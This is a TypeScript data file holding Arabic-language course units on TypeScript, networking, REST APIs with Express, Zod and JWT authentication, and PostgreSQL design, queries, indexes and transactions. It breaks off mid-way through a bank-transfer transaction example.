import { StageDef } from './types';

export const stage3: StageDef = {
  id: "stage-3",
  stageNumber: 3,
  title: "الأنظمة والهيكلية",
  units: [
    {
      id: "unit-11",
      stageId: "stage-3",
      unitNumber: 10,
      title: "TypeScript والشبكات وبناء APIs",
      description: "TypeScript المتقدم، بروتوكولات الشبكات، وبناء REST API احترافي مع Node.js.",
      content: [
        { type: "h1", content: "الوحدة 11: TypeScript والشبكات وبناء APIs" },
        { type: "p", content: "في هذه الوحدة ننتقل من كتابة كود يعمل على جهازك إلى بناء خوادم تخدم آلاف المستخدمين عبر الإنترنت. TypeScript هي JavaScript مع نظام أنواع قوي — تكتشف الأخطاء قبل التشغيل، وتجعل الكود أكثر وضوحاً وأسهل للصيانة. كل شركة تقنية كبرى تستخدمها اليوم." },
        { type: "p", content: "بناء الـ APIs هو صميم عمل مطور الـ Backend. فهم TypeScript العميق وبروتوكولات الشبكة يجعلك قادراً على بناء APIs سريعة وآمنة وقابلة للتوسع. هذه المهارات هي ما يفصلك عن 90% من المتقدمين للوظائف." },

        { type: "h2", content: "1. TypeScript — ما وراء الأنواع الأساسية" },
        { type: "h3", content: "Generics — الأنواع المرنة" },
        { type: "p", content: "Generics تتيح لك كتابة كود يعمل مع أي نوع مع الحفاظ على أمان الأنواع. بدلاً من any الذي يُلغي كل أمان، Generic يقول: 'لا أعرف النوع الآن، لكن سأُبقيه ثابتاً ومتسقاً طوال الدالة أو الكلاس'." },
        { type: "code", language: "typescript", title: "Generics في الممارسة الفعلية", content: `// ❌ بدون Generics: any يُلغي أمان الأنواع
function first(arr: any[]): any { return arr[0]; }
const name = first(["Ali", "Sara"]);
name.toUpperCase(); // لا يوجد تحقق — قد يفشل وقت التشغيل!

// ✅ مع Generics: TypeScript يتتبع النوع الفعلي
function first<T>(arr: T[]): T | undefined {
  return arr[0];
}
const name = first(["Ali", "Sara"]); // TypeScript يعرف: string | undefined
const age  = first([25, 30, 35]);   // TypeScript يعرف: number | undefined

// Generic مع قيد (Constraint) — T يجب أن يكون له خاصية length
function longest<T extends { length: number }>(a: T, b: T): T {
  return a.length >= b.length ? a : b;
}
longest("hello", "hi");          // "hello" ✅
longest([1, 2], [1, 2, 3]);      // [1, 2, 3] ✅
// longest(1, 2);                // Error: number لا يملك length ✅

// Generic مع keyof
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key];
}
const user = { name: "Ahmed", age: 25, email: "a@b.com" };
const email = getProperty(user, "email");  // TypeScript يعرف: string ✅
// getProperty(user, "phone");  // Error: "phone" ليست key في النوع ✅

// Generic Class للـ API Responses
class ApiResponse<T> {
  constructor(
    public data: T,
    public status: number,
    public message: string
  ) {}
  isSuccess(): boolean { return this.status >= 200 && this.status < 300; }
}

const usersResp = new ApiResponse<User[]>(users, 200, "OK");
if (usersResp.isSuccess()) {
  usersResp.data.forEach(u => console.log(u.name)); // TypeScript يعرف: u هو User
}` },

        { type: "h3", content: "Utility Types — أدوات مدمجة في TypeScript" },
        { type: "p", content: "TypeScript يأتي بمجموعة من أنواع المساعدة (Utility Types) التي تحوّل الأنواع الموجودة. هذه الأدوات توفر عليك كتابة أنواع متكررة وتجعل الكود أكثر دقة." },
        { type: "code", language: "typescript", title: "Utility Types العملية الكاملة", content: `interface User {
  id: number;
  name: string;
  email: string;
  passwordHash: string;
  role: "admin" | "client";
  createdAt: Date;
}

// Partial: كل الحقول اختيارية (للـ PATCH endpoints)
type UpdateUserDto = Partial<User>;
// { id?: number; name?: string; email?: string; ... }

// Required: كل الحقول إلزامية
type FullUser = Required<User>;

// Pick: اختر حقولاً محددة فقط
type PublicUser = Pick<User, "id" | "name" | "email">;
// { id: number; name: string; email: string; }

// Omit: احذف حقولاً محددة
type SafeUser = Omit<User, "passwordHash">;
// كل شيء بدون passwordHash — مناسب للـ API responses

// Record: بناء قواميس محددة النوع
type RolePermissions = Record<User["role"], string[]>;
const permissions: RolePermissions = {
  admin: ["create", "read", "update", "delete"],
  client: ["read"]
};

// Readonly: يمنع التعديل بعد الإنشاء
type ImmutableUser = Readonly<User>;
const frozenUser: ImmutableUser = { ...user };
// frozenUser.name = "new"; // Error: Cannot assign to 'name'

// Extract و Exclude للـ Union Types
type AdminOrClient = "admin" | "client" | "moderator";
type OnlyAdminClient = Extract<AdminOrClient, "admin" | "client">; // "admin" | "client"
type WithoutModerator = Exclude<AdminOrClient, "moderator">;       // "admin" | "client"

// ReturnType و Parameters
async function fetchUser(id: number): Promise<User> { return {} as User; }
type FetchedUser = Awaited<ReturnType<typeof fetchUser>>; // User
type FetchParams = Parameters<typeof fetchUser>;          // [number]` },

        { type: "h3", content: "Type Guards — تضييق الأنواع بأمان" },
        { type: "p", content: "Type Guards تسمح لـ TypeScript بتضييق النوع في فرع معين من الكود. بدلاً من استخدام as التي قد تخفي أخطاء، استخدم Type Guards للتحقق الفعلي." },
        { type: "code", language: "typescript", title: "Type Guards وDiscriminated Unions", content: `// Discriminated Union: كل نوع له خاصية مميزة (discriminant)
type Shape =
  | { kind: "circle";    radius: number }
  | { kind: "square";    side: number }
  | { kind: "rectangle"; width: number; height: number };

function area(shape: Shape): number {
  switch (shape.kind) {  // TypeScript يعرف النوع الدقيق داخل كل case
    case "circle":    return Math.PI * shape.radius ** 2;
    case "square":    return shape.side ** 2;
    case "rectangle": return shape.width * shape.height;
    // TypeScript يتحقق من exhaustiveness — لو أضفت نوعاً جديداً سيطالبك بـ case له
  }
}

// User-defined Type Guard — دالة تُصرّح بالنوع
function isUser(value: unknown): value is User {
  return (
    typeof value === "object" && value !== null &&
    "id" in value && typeof (value as any).id === "number" &&
    "name" in value && typeof (value as any).name === "string"
  );
}

// استخدام Type Guard مع بيانات خارجية
const rawData = await fetch("/api/user").then(r => r.json());
if (isUser(rawData)) {
  console.log(rawData.name); // TypeScript يعرف أنه User
} else {
  console.error("بيانات غير صالحة");
}` },

        { type: "h2", content: "2. كيف تعمل الشبكات — من الجهل إلى الفهم" },
        { type: "p", content: "كل مطور Backend يجب أن يفهم رحلة الطلب من المتصفح للخادم وعودته. هذا الفهم يساعد في تشخيص المشاكل، تحسين الأداء، وتأمين التطبيق." },
        { type: "ascii", content: `
 ما يحدث عند فتح google.com:

 [1] المتصفح                    [2] DNS Resolver
     كتبت google.com    ──────►      ما IP لـ google.com؟
                         ◄──────      142.250.x.x

 [3] TCP Handshake               [4] TLS Handshake (HTTPS)
     Client ──SYN──►  Server         تبادل شهادات SSL
     Client ◄─SYN/ACK─ Server        مفتاح تشفير متفق عليه
     Client ──ACK──►  Server         الاتصال آمن ومشفر ✅

 [5] HTTP Request                [6] HTTP Response
     GET / HTTP/2.0    ──────►       HTTP/2.0 200 OK
     Host: google.com               Content-Type: text/html
     Accept: text/html  ◄──────     [محتوى HTML مضغوط]
` },
        { type: "table", headers: ["الطبقة", "البروتوكول", "الوظيفة", "مثال"], rows: [
          ["التطبيق", "HTTP, WebSocket, gRPC", "تبادل البيانات بين التطبيقات", "طلبات API"],
          ["النقل", "TCP, UDP", "تقطيع وتجميع البيانات بموثوقية", "TCP: موثوق، UDP: سريع للبث"],
          ["الشبكة", "IP", "توجيه البيانات عبر الشبكات", "عناوين IP v4/v6"],
          ["الوصول", "Ethernet, WiFi", "النقل المادي للبيانات", "كابلات، موجات راديو"]
        ]},

        { type: "h2", content: "3. رموز حالة HTTP — دليل كامل" },
        { type: "p", content: "رموز الحالة (Status Codes) هي لغة التواصل بين الخادم والعميل. استخدام الكود الصحيح يجعل الـ API قابلة للتوقع ويُسهّل تشخيص المشاكل." },
        { type: "table", headers: ["الكود", "المعنى", "متى تستخدمه؟"], rows: [
          ["200 OK", "نجح الطلب", "GET/PUT/PATCH ناجح"],
          ["201 Created", "تم الإنشاء", "POST أنشأ سجلاً جديداً"],
          ["204 No Content", "نجح بدون محتوى", "DELETE ناجح"],
          ["400 Bad Request", "طلب خاطئ", "بيانات الطلب غير صالحة"],
          ["401 Unauthorized", "غير مصادَق", "JWT مفقود أو منتهي"],
          ["403 Forbidden", "غير مصرَّح", "مصادَق لكن لا صلاحية"],
          ["404 Not Found", "غير موجود", "السجل المطلوب لا يوجد"],
          ["409 Conflict", "تعارض", "البريد مسجل مسبقاً"],
          ["422 Unprocessable", "بيانات غير قابلة للمعالجة", "فشل التحقق من البيانات"],
          ["500 Internal Error", "خطأ في الخادم", "استثناء غير معالَج"]
        ]},

        { type: "h2", content: "4. بناء REST API احترافي مع Express + Zod" },
        { type: "p", content: "REST ليس مجرد 'استخدام HTTP'. له مبادئ تجعل الـ API قابلة للتوقع والفهم لأي مطور. Express هو إطار Node.js الأكثر استخداماً، وZod مكتبة للتحقق من البيانات مع أمان الأنواع." },
        { type: "code", language: "typescript", title: "REST API احترافي كامل مع Express + Zod", content: `import express, { Request, Response, NextFunction } from 'express';
import { z } from 'zod';

const app = express();
app.use(express.json());

// Schema التحقق من البيانات — يولّد أنواع TypeScript تلقائياً
const CreateUserSchema = z.object({
  name:     z.string().min(2, "الاسم قصير جداً").max(100),
  email:    z.string().email("البريد غير صالح"),
  password: z.string().min(8, "كلمة المرور قصيرة جداً")
             .regex(/[A-Z]/, "تحتاج حرفاً كبيراً")
             .regex(/[0-9]/, "تحتاج رقماً"),
  age:      z.number().min(13).max(120).optional()
});

type CreateUserDto = z.infer<typeof CreateUserSchema>;

// Middleware عام للتحقق من البيانات
function validate<T>(schema: z.ZodSchema<T>) {
  return (req: Request, res: Response, next: NextFunction): void => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      res.status(400).json({
        error: "بيانات غير صالحة",
        details: result.error.flatten().fieldErrors
      });
      return;
    }
    req.body = result.data;
    next();
  };
}

// Router للمستخدمين
const usersRouter = express.Router();

// GET /api/v1/users?page=1&limit=20&role=admin
usersRouter.get('/', async (req: Request, res: Response) => {
  const { page = '1', limit = '20', role } = req.query;
  const pageNum  = Math.max(1, parseInt(page as string));
  const limitNum = Math.min(100, parseInt(limit as string));

  const users = await userService.findAll({
    page: pageNum,
    limit: limitNum,
    role: role as string | undefined
  });

  res.json({
    data: users.items,
    meta: { page: pageNum, limit: limitNum, total: users.total,
            totalPages: Math.ceil(users.total / limitNum) }
  });
});

// GET /api/v1/users/:id
usersRouter.get('/:id', async (req: Request, res: Response) => {
  const user = await userService.findById(req.params.id);
  if (!user) {
    res.status(404).json({ error: 'المستخدم غير موجود' });
    return;
  }
  res.json(user);
});

// POST /api/v1/users
usersRouter.post('/', validate(CreateUserSchema), async (req: Request, res: Response) => {
  const dto: CreateUserDto = req.body;
  const existing = await userService.findByEmail(dto.email);
  if (existing) {
    res.status(409).json({ error: 'البريد الإلكتروني مسجل مسبقاً' });
    return;
  }
  const user = await userService.create(dto);
  res.status(201).json(user);
});

app.use('/api/v1/users', usersRouter);` },

        { type: "h2", content: "5. المصادقة بـ JWT — شرح عميق" },
        { type: "ascii", content: `
JWT = Header.Payload.Signature

Header (Base64):        Payload (Base64):         Signature (HMAC):
{                       {                          HMACSHA256(
  "alg": "HS256",         "sub": "user-id-123",    base64url(header) +
  "typ": "JWT"            "role": "admin",          "." +
}                         "iat": 1703000000,        base64url(payload),
                          "exp": 1703086400         secret_key
                        }                          )

⚠️ Base64 ليس تشفيراً — الـ Payload قابل للقراءة من أي أحد
✅ الـ Signature يضمن أن الخادم فقط يوقّع ويتحقق من صحة التوكن
` },
        { type: "code", language: "typescript", title: "JWT Authentication كامل مع Refresh Tokens", content: `import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';

const ACCESS_SECRET  = process.env.JWT_ACCESS_SECRET!;
const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET!;

export const authService = {
  async register(email: string, password: string, name: string) {
    const passwordHash = await bcrypt.hash(password, 12);
    const user = await db.users.create({ email, passwordHash, name });
    return this.generateTokens(user);
  },

  async login(email: string, password: string) {
    const user = await db.users.findByEmail(email);
    // رسالة عامة — لا تُحدد أيهما خاطئ (أمان)
    if (!user) throw new Error('بيانات غير صحيحة');
    const valid = await bcrypt.compare(password, user.passwordHash);
    if (!valid) throw new Error('بيانات غير صحيحة');
    return this.generateTokens(user);
  },

  generateTokens(user: { id: string; role: string }) {
    const accessToken = jwt.sign(
      { sub: user.id, role: user.role },
      ACCESS_SECRET,
      { expiresIn: '15m', algorithm: 'HS256' }  // قصير للأمان
    );
    const refreshToken = jwt.sign(
      { sub: user.id },
      REFRESH_SECRET,
      { expiresIn: '7d', algorithm: 'HS256' }   // أطول لتجربة المستخدم
    );
    return { accessToken, refreshToken };
  },

  verifyAccess(token: string): { sub: string; role: string } {
    return jwt.verify(token, ACCESS_SECRET) as { sub: string; role: string };
  },

  async refreshTokens(refreshToken: string) {
    const payload = jwt.verify(refreshToken, REFRESH_SECRET) as { sub: string };
    const user = await db.users.findById(payload.sub);
    if (!user) throw new Error('المستخدم غير موجود');
    return this.generateTokens(user);
  }
};` },
        { type: "callout", calloutType: "warning", title: "قواعد أمان JWT لا تُكسر", content: [
          { type: "p", content: "✅ خزّن الـ JWT في httpOnly Cookie — ليس localStorage (عرضة لـ XSS)" },
          { type: "p", content: "✅ استخدم Access Token قصير (15 دقيقة) + Refresh Token طويل (7 أيام)" },
          { type: "p", content: "✅ HTTPS دائماً في الإنتاج — JWT بدونه ينتقل مكشوفاً" },
          { type: "p", content: "❌ لا تضع بيانات حساسة في الـ Payload — الجميع يستطيع قراءته" }
        ]},

        { type: "h2", content: "6. Middleware — قلب تطبيق Express" },
        { type: "p", content: "Middleware هي دوال تُنفّذ بين استقبال الطلب وإرسال الاستجابة. كل middleware يأخذ (req, res, next) — إما يُعالج الطلب ويُرسل استجابة، أو يمرره للـ middleware التالية بـ next()." },
        { type: "code", language: "typescript", title: "Middlewares متعددة الاستخدام", content: `import { Request, Response, NextFunction } from 'express';

// 1. Middleware التوثيق
export function authenticate(req: Request, res: Response, next: NextFunction): void {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    res.status(401).json({ error: 'توكن المصادقة مطلوب' });
    return;
  }
  try {
    const token = authHeader.split(' ')[1];
    const payload = authService.verifyAccess(token);
    req.user = { id: payload.sub, role: payload.role };
    next();
  } catch {
    res.status(401).json({ error: 'توكن غير صالح أو منتهي الصلاحية' });
  }
}

// 2. Middleware التفويض
export function authorize(...roles: string[]) {
  return (req: Request, res: Response, next: NextFunction): void => {
    if (!req.user || !roles.includes(req.user.role)) {
      res.status(403).json({ error: 'ليس لديك صلاحية لهذه العملية' });
      return;
    }
    next();
  };
}

// 3. Middleware تسجيل الطلبات
export function requestLogger(req: Request, res: Response, next: NextFunction): void {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(\`\${req.method} \${req.path} \${res.statusCode} \${duration}ms\`);
  });
  next();
}

// 4. Global Error Handler
export function errorHandler(
  err: Error, req: Request, res: Response, _next: NextFunction
): void {
  console.error(err.stack);
  if (err.name === 'ValidationError') {
    res.status(400).json({ error: err.message });
    return;
  }
  res.status(500).json({ error: 'حدث خطأ داخلي في الخادم' });
}

// الاستخدام
app.use(requestLogger);
app.get('/admin', authenticate, authorize('admin'), adminController.dashboard);` },

        { type: "project", title: "بناء API متكامل لنظام المدونة", content: [
          { type: "p", content: "API حقيقي يجمع كل ما تعلمناه: TypeScript، Express، JWT، Zod، وهيكل احترافي:" },
          { type: "code", language: "typescript", content: `// src/app.ts — نقطة دخول التطبيق
import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import { errorHandler, requestLogger } from './middleware';
import { authRouter }  from './routes/auth';
import { postsRouter } from './routes/posts';

const app = express();

// Security & Parsing Middlewares
app.use(helmet());
app.use(cors({ origin: process.env.FRONTEND_URL, credentials: true }));
app.use(express.json({ limit: '10mb' }));
app.use(requestLogger);

// Health Check
app.get('/api/health', (_req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Routes
app.use('/api/v1/auth',  authRouter);
app.use('/api/v1/posts', postsRouter);

// Error Handler (يجب أن يكون آخر middleware)
app.use(errorHandler);

export default app;

// ══════════════════════════════════
// src/routes/posts.ts
// ══════════════════════════════════
import { Router } from 'express';
import { z } from 'zod';
import { authenticate, validate } from '../middleware';

const router = Router();

const CreatePostSchema = z.object({
  title:      z.string().min(5).max(200),
  content:    z.string().min(50),
  categoryId: z.number().int().positive().optional(),
  tags:       z.array(z.string()).max(10).optional()
});

// GET /api/v1/posts — عام
router.get('/', async (req, res) => {
  const { page = 1, limit = 20 } = req.query;
  const posts = await postService.findPublished({
    page: Number(page),
    limit: Number(limit)
  });
  res.json(posts);
});

// POST /api/v1/posts — يحتاج مصادقة
router.post('/',
  authenticate,
  validate(CreatePostSchema),
  async (req, res) => {
    const post = await postService.create({
      ...req.body,
      authorId: req.user!.id
    });
    res.status(201).json(post);
  }
);

export { router as postsRouter };` }
        ]},

        { type: "active-recall", questions: [
          { q: "ما هو Generic في TypeScript ولماذا يُفضَّل على any؟", a: "Generic يسمح بكتابة كود مرن يعمل مع أنواع متعددة مع الحفاظ على أمان الأنواع. any يُلغي كل تحقق. مثال: function first<T>(arr: T[]): T تعمل مع أي نوع وتُرجع نفس النوع." },
          { q: "ما الفرق بين 401 و 403؟", a: "401 Unauthorized: المستخدم غير مصادَق (لا يملك توكناً أو توكنه منتهٍ) — يجب تسجيل الدخول أولاً. 403 Forbidden: المستخدم مصادَق لكن ليس لديه صلاحية — مسجل دخول لكن لا يُسمح له." },
          { q: "ما دور Middleware في Express وكيف يعمل؟", a: "Middleware دالة تُنفّذ بين الطلب والاستجابة. تأخذ (req, res, next) وإما تُرسل استجابة أو تمرر للـ middleware التالية بـ next(). تُستخدم للتوثيق، التسجيل، التحقق من البيانات، معالجة الأخطاء." },
          { q: "لماذا لا نخزن JWT في localStorage؟", a: "localStorage قابل للوصول من JavaScript، مما يجعله هدفاً لهجمات XSS. httpOnly Cookie لا يمكن قراءتها من JavaScript على الإطلاق — يتعامل معها المتصفح مباشرة." },
          { q: "ما الفرق بين Access Token وRefresh Token؟", a: "Access Token: قصير الأمد (15 دقيقة) يُرسل مع كل طلب API. Refresh Token: طويل الأمد (7 أيام) يُستخدم لتجديد الـ Access Token فقط. الفصل يحسن الأمان: إذا سُرق الـ Access Token فصلاحيته تنتهي قريباً." }
        ]}
      ]
    },
    {
      id: "unit-12",
      stageId: "stage-3",
      unitNumber: 11,
      title: "قواعد البيانات العلاقية (PostgreSQL)",
      description: "تصميم قواعد البيانات، التطبيع، الاستعلامات المتقدمة، والـ ORM.",
      content: [
        { type: "h1", content: "الوحدة 12: قواعد البيانات العلاقية (PostgreSQL)" },
        { type: "p", content: "قاعدة البيانات هي قلب أي تطبيق. كل بيانات المستخدمين، الطلبات، الإعدادات — كل شيء هنا. قرار التصميم الخاطئ اليوم يكلفك أشهراً من الـ Migration لاحقاً حين تنمو البيانات. سنتعلم التصميم الصحيح منذ البداية." },
        { type: "p", content: "PostgreSQL هي أقوى قاعدة بيانات علائقية مفتوحة المصدر. تدعم JSON، Full-Text Search، Geographic Data، وإمكانيات متقدمة لم تكن متوفرة تقليدياً إلا في الأنظمة التجارية المدفوعة. تستخدمها شركات مثل Instagram وReddit وDisqus." },

        { type: "h2", content: "1. العلاقات بين الجداول" },
        { type: "p", content: "قواعد البيانات العلائقية قوتها في تحديد العلاقات بين البيانات. ثلاثة أنواع أساسية: One-to-One (مستخدم له ملف شخصي واحد)، One-to-Many (مستخدم له كثير من الطلبات)، Many-to-Many (طلاب وكورسات — كل طالب في كورسات متعددة)." },
        { type: "ascii", content: `
One-to-Many (الأكثر شيوعاً):
┌─────────┐         ┌──────────┐
│  users  │ 1 ───► N│  posts   │
│  id PK  │         │  id PK   │
│  name   │         │ author_id│ FK → users.id
└─────────┘         └──────────┘

Many-to-Many (عبر جدول وسيط):
┌─────────┐  ┌───────────┐  ┌──────────┐
│ students│  │enrollments│  │ courses  │
│  id PK  │◄─│student_id │─►│  id PK   │
│  name   │  │course_id  │  │  title   │
└─────────┘  └───────────┘  └──────────┘
` },

        { type: "h2", content: "2. التطبيع — مبادئ تصميم البيانات" },
        { type: "p", content: "التطبيع (Normalization) هو عملية تنظيم الجداول لتقليل التكرار وضمان الاتساق. البيانات المكررة مشكلة: إذا تغير اسم مدينة يجب تحديثه في آلاف الصفوف — وإذا نسيت صفاً واحداً صارت البيانات متناقضة." },
        { type: "table", headers: ["المرحلة", "الشرط", "المشكلة التي تحلها"], rows: [
          ["1NF (الأولى)", "لا مجموعات في خلية واحدة، لكل صف معرّف فريد", "phones='0501234,0559876' → جدول منفصل للهواتف"],
          ["2NF (الثانية)", "كل عمود يعتمد على Primary Key كاملاً", "اسم المنتج في order_items يعتمد على product_id وحده"],
          ["3NF (الثالثة)", "لا اعتماد غير مباشر بين الأعمدة غير المفتاحية", "city → zip_code → country: ينقل country لجدول مستقل"]
        ]},
        { type: "code", language: "sql", title: "تصميم متكامل لتطبيق مدونة", content: `-- ════════════════════════════════
-- المستخدمون
-- ════════════════════════════════
CREATE TABLE users (
  id            UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
  username      VARCHAR(50) NOT NULL UNIQUE,
  email         TEXT        NOT NULL UNIQUE,
  password_hash TEXT        NOT NULL,
  bio           TEXT,
  avatar_url    TEXT,
  is_active     BOOLEAN     NOT NULL DEFAULT TRUE,
  created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at    TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- ════════════════════════════════
-- التصنيفات
-- ════════════════════════════════
CREATE TABLE categories (
  id   SERIAL      PRIMARY KEY,
  slug VARCHAR(100) NOT NULL UNIQUE,
  name VARCHAR(100) NOT NULL
);

-- ════════════════════════════════
-- المقالات
-- ════════════════════════════════
CREATE TABLE posts (
  id           UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
  author_id    UUID        NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  category_id  INTEGER     REFERENCES categories(id) ON DELETE SET NULL,
  title        TEXT        NOT NULL,
  slug         TEXT        NOT NULL UNIQUE,
  content      TEXT        NOT NULL,
  excerpt      TEXT,
  cover_url    TEXT,
  status       VARCHAR(20) NOT NULL DEFAULT 'draft'
               CHECK (status IN ('draft','published','archived')),
  view_count   INTEGER     NOT NULL DEFAULT 0,
  published_at TIMESTAMPTZ,
  created_at   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at   TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- علاقة N:M — المقالات والوسوم
CREATE TABLE tags (
  id   SERIAL      PRIMARY KEY,
  slug VARCHAR(100) NOT NULL UNIQUE,
  name VARCHAR(100) NOT NULL
);

CREATE TABLE post_tags (
  post_id UUID    NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
  tag_id  INTEGER NOT NULL REFERENCES tags(id)  ON DELETE CASCADE,
  PRIMARY KEY (post_id, tag_id)
);

-- التعليقات مع دعم الردود (علاقة ذاتية)
CREATE TABLE comments (
  id         UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
  post_id    UUID        NOT NULL REFERENCES posts(id)    ON DELETE CASCADE,
  author_id  UUID        NOT NULL REFERENCES users(id)    ON DELETE CASCADE,
  parent_id  UUID        REFERENCES comments(id)          ON DELETE CASCADE,
  content    TEXT        NOT NULL,
  is_edited  BOOLEAN     NOT NULL DEFAULT FALSE,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- دالة تحديث updated_at تلقائياً
CREATE OR REPLACE FUNCTION update_updated_at()
RETURNS TRIGGER AS $$
BEGIN NEW.updated_at = NOW(); RETURN NEW; END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER posts_updated_at
  BEFORE UPDATE ON posts
  FOR EACH ROW EXECUTE FUNCTION update_updated_at();` },

        { type: "h2", content: "3. الاستعلامات المتقدمة" },
        { type: "p", content: "إتقان SQL هو مهارة تُميّزك. معظم مشاكل الأداء في التطبيقات سببها استعلامات SQL غير مُحسّنة. الـ JOINs والـ CTEs وWindowFunctions هي الأدوات التي تحوّل استعلامات متعددة إلى استعلام واحد فعّال." },
        { type: "code", language: "sql", title: "JOINs متقدمة والـ CTEs", content: `-- ════════════════════════════════
-- استعلام معقد: المقالات مع كل بياناتها
-- ════════════════════════════════
SELECT
  p.id,
  p.title,
  p.slug,
  p.status,
  p.view_count,
  p.published_at,
  u.username           AS author_name,
  u.avatar_url         AS author_avatar,
  c.name               AS category,
  COUNT(DISTINCT cm.id)   AS comments_count,
  ARRAY_AGG(DISTINCT t.name) FILTER (WHERE t.name IS NOT NULL) AS tags

FROM posts p
LEFT JOIN users      u  ON p.author_id    = u.id
LEFT JOIN categories c  ON p.category_id  = c.id
LEFT JOIN comments   cm ON cm.post_id     = p.id
LEFT JOIN post_tags  pt ON pt.post_id     = p.id
LEFT JOIN tags       t  ON pt.tag_id      = t.id

WHERE p.status = 'published'
GROUP BY p.id, u.username, u.avatar_url, c.name
ORDER BY p.published_at DESC
LIMIT 20 OFFSET 0;

-- ════════════════════════════════
-- CTE: المقالات الأكثر تعليقاً
-- ════════════════════════════════
WITH comment_counts AS (
  SELECT post_id, COUNT(*) AS total
  FROM comments
  GROUP BY post_id
),
top_posts AS (
  SELECT p.*, cc.total AS comments_total
  FROM posts p
  JOIN comment_counts cc ON p.id = cc.post_id
  WHERE p.status = 'published'
  ORDER BY cc.total DESC
  LIMIT 10
)
SELECT tp.title, tp.comments_total, u.username
FROM top_posts tp
JOIN users u ON tp.author_id = u.id;

-- ════════════════════════════════
-- Window Functions: ترتيب الكتّاب
-- ════════════════════════════════
SELECT
  u.username,
  COUNT(p.id) AS post_count,
  RANK() OVER (ORDER BY COUNT(p.id) DESC) AS rank
FROM users u
JOIN posts p ON p.author_id = u.id AND p.status = 'published'
GROUP BY u.id, u.username
ORDER BY rank;` },

        { type: "h2", content: "4. الفهارس (Indexes) — مفتاح الأداء" },
        { type: "p", content: "الفهرس كفهرس الكتاب: بدونه تقرأ كل الصفحات للعثور على كلمة. معه تقفز مباشرة للصفحة المطلوبة. PostgreSQL يدعم أنواعاً متعددة من الفهارس لأغراض مختلفة." },
        { type: "code", language: "sql", title: "أنواع الفهارس وإنشاؤها", content: `-- فهرس B-Tree (الافتراضي) — للمقارنات والترتيب
CREATE INDEX idx_posts_status       ON posts(status);
CREATE INDEX idx_posts_author_id    ON posts(author_id);
CREATE INDEX idx_posts_published_at ON posts(published_at DESC);

-- فهرس مركّب: يُستخدم عند الاستعلام بعدة حقول معاً
-- ترتيب الحقول مهم: ضع الأكثر انتقائية أولاً
CREATE INDEX idx_posts_status_pub ON posts(status, published_at DESC);

-- فهرس Partial: فقط على الصفوف المنشورة
CREATE INDEX idx_posts_published ON posts(published_at DESC)
  WHERE status = 'published';  -- أصغر وأسرع!

-- فهرس للبحث النصي الكامل
ALTER TABLE posts ADD COLUMN search_vector tsvector
  GENERATED ALWAYS AS (
    to_tsvector('arabic', title || ' ' || COALESCE(content, ''))
  ) STORED;
CREATE INDEX idx_posts_fts ON posts USING GIN(search_vector);

-- استخدام البحث النصي
SELECT title, ts_rank(search_vector, query) AS rank
FROM posts, plainto_tsquery('arabic', 'قواعد البيانات') query
WHERE search_vector @@ query AND status = 'published'
ORDER BY rank DESC;

-- تحليل أداء الاستعلام
EXPLAIN ANALYZE
  SELECT * FROM posts WHERE author_id = 'some-uuid' AND status = 'published';
-- ابحث عن "Index Scan" — إذا رأيت "Seq Scan" ربما تحتاج فهرساً
-- المهم: عدد Rows المُقدَّر مقابل الفعلي (كبر الفجوة = إحصائيات قديمة)` },
        { type: "callout", calloutType: "warning", title: "متى لا تُضيف فهرساً؟", content: [
          { type: "p", content: "الفهارس تُبطئ INSERT وUPDATE وDELETE لأنها تُحدَّث مع كل تغيير. لا تُضف فهرساً على: جداول صغيرة (أقل من 1000 صف)، حقول نادرة الاستخدام في WHERE، حقول ذات قيم متكررة جداً (مثل boolean — نصف الصفوف true ونصفها false)." }
        ]},

        { type: "h2", content: "5. المعاملات (Transactions) وخصائص ACID" },
        { type: "table", headers: ["الخاصية", "الاسم", "الشرح", "مثال"], rows: [
          ["A", "Atomicity (الذرية)", "كل شيء ينجح أو كل شيء يُلغى", "تحويل بنكي: خصم + إضافة معاً"],
          ["C", "Consistency (الاتساق)", "DB دائماً في حالة صحيحة", "Foreign Key: لا تعليق بدون مقال"],
          ["I", "Isolation (العزل)", "معاملات متوازية لا تتأثر ببعضها", "حجز مقعد أخير — لا يُحجز مرتين"],
          ["D", "Durability (الثبات)", "البيانات تثبت حتى بعد انقطاع الكهرباء", "WAL في PostgreSQL"]
        ]},
        { type: "code", language: "typescript", title: "Transaction آمن في Node.js", content: `import { Pool, PoolClient } from 'pg';
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// دالة مساعدة لتشغيل كود ضمن transaction
async function withTransaction<T>(
  fn: (client: PoolClient) => Promise<T>
): Promise<T> {
  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    const result = await fn(client);
    await client.query('COMMIT');
    return result;
  } catch (error) {
    await client.query('ROLLBACK');
    throw error;
  } finally {
    client.release();
  }
}

// تحويل بنكي آمن
async function transferMoney(fromId: string, toId: string, amount: number) {
  return withTransaction(async (client) => {
    // FOR UPDATE: يقفل الصف لمنع Race Conditions
    const { rows: [from] } = await client.query(
      'SELECT balance FROM accounts WHERE id = $1 FOR UPDATE',
      [fromId]
    );
    if (!from) throw new Error('الحساب المصدر غير موجود');
    if (from.balance < amount) throw new Error('رصيد غير كافٍ');

    await client.query(
      'UPDATE accounts SET balance = balance - $1, updated_at = NOW() WHERE id = $2',
      [amount, fromId]
    );
    await client.query(
      'UPDATE accounts SET balance = balance + $1, updated_at = NOW() WHERE id = $2',
      [amount, toId]
    );
    await client.query(
